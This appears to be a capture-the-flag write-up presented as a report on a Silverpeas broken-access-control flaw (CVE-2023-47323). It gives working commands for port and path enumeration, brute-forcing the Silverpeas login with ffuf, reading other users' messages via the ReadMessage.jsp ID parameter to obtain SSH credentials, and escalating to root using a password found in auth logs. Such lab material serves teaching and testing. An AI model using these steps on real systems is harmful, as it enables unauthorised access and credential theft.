# Silverpeas Broken Access Control to Allows Attacker to Read All Messages
## Risk Rating

**NIST**: NVD  
Base Score: $${\color{red}8.1 HIGH}$$
**ADP**: CISA-ADP
Base Score: $${\color{red}8.1 HIGH}$$

## Summary
The notification/messaging feature does not enforce access control on the ID parameter, allowing any user to read all messages.
## Technical Details & Evidence
Enumerating information from the target by using `nmap`
```
nmap -T4 -sV -O -A -v 10.10.... -oN nmap.txt
```
It is noticable that open ports are `22`, `80` ,`8080`.
Accessing the target website via port `80`, it is obvious to gather the `username : scr1ptkiddy` and some information aobut a page call `silverpeas` in the contact section
The process of enumerating paths of the target with to ports `80` and `8080` was executed by `gobuster`
```
gobuster dir -u "http://10.10...." -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js,.txt -t 100
```
- With port `80`:
`/assets`
`/images`
`/README.txt`
`/LICENSE.txt`
```
gobuster dir -u "http://10.10....:8080" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js,.txt -t 100
```
- With port `8080` (cannot access normally to this port):
`/console`
`/website`
Manually brute-forcing path `silverpeas` to 2 ports and port `8080` did respond and redirect to a login page.
Using `ffuf` to brute-force the password, but it was mentioned that `rockyou.txt` would not work. Therefore, it is possible to try every single character of page port `80`.
First, creating a list containing every single character of the website port `80` by using `cewl`
```
cewl http://10.10.... / > passwords.txt
```
Then, start the brute-force attack
```
ffuf -u 'http://10.10....:8080/silverpeas/AuthenticationServlet' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'Login=scr1ptkiddy&Password=FUZZ&DomainId=0' -w passwords.txt -r -mc all -t 100 -fs 8282
```
Searching for vulnerabilities in Silverpeas, we find [CVE-2023-47323](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323), which allows reading all messages via the `http://localhost:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=[messageID]` endpoint.

Exploiting this vulnerability to read the messages, when we read the message with ID `6` (`http://10.10.191.243:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6`), we find the SSH credentials for the `tim` user.
```
ssh tim@10.10....
```
## Shell as root

```
tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```
tim is in adm group which means that checking /var/log/ may helps to find the password to escalate.
```
grep -Ei 'password' cat /var/log/auth*
```
- `E` for extended grexp
- `i`  for ignoring the case
Found
```
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=******** -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```
Note: because tyler has user as  `root`, looking for tyler is the best way.
Then using `ssh` connect under tyler
```
ssh tyler@10.10....
```
```
tyler@silver-platter:~$ sudo su
```
Gaining access as root successfully
# Reference
- [rihno security lab](https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/)
- [CVE-2023-47323](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323)
